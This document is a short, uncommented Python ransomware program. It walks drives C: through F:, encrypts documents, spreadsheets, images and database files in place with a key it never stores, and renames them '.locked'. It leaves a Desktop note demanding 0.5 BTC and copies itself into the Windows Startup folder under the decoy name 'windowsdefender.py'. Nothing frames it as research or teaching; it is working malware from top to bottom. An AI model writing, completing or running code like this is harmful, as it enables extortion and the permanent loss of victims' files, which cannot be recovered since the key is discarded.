import os
import json
from cryptography.fernet import Fernet
from datetime import datetime

class Ransomware:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.extensions = ['.docx','.xlsx','.pdf','.jpg','.png','.sql','.mdb']
        self.ransom_note = """
=== YOUR FILES HAVE BEEN ENCRYPTED ===
Contact: admin@protonmail.com
Payment: 0.5 BTC
"""
    
    def encrypt_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = self.cipher.encrypt(data)
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            os.rename(filepath, f"{filepath}.locked")
        except Exception as e:
            pass
    
    def scan_drives(self):
        drives = ['C:','D:','E:','F:']
        for drive in drives:
            for root, _, files in os.walk(drive):
                for file in files:
                    if any(file.endswith(ext) for ext in self.extensions):
                        self.encrypt_file(os.path.join(root, file))
    
    def drop_note(self):
        note_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'READ_ME.txt')
        with open(note_path, 'w') as f:
            f.write(self.ransom_note)
    
    def persist(self):
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\')
        with open(__file__, 'r') as src, open(os.path.join(startup, 'windowsdefender.py'), 'w') as dst:
            dst.write(src.read())

if __name__ == "__main__":
    ransomware = Ransomware()
    ransomware.scan_drives()
    ransomware.drop_note()
    ransomware.persist()
